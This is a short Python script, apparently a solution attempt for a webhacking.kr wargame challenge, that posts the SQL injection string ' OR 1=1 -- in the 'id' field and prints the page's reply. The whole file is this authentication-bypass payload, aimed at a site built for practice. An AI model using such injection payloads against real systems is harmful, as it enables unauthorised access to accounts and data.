import requests

url = "https://webhacking.kr/challenge/bonus-10/index.php"

crack = '''\' OR 1=1 -- '''


data = { "id": crack }
    
response = requests.post(url, data=data)                                

print(response.text)

    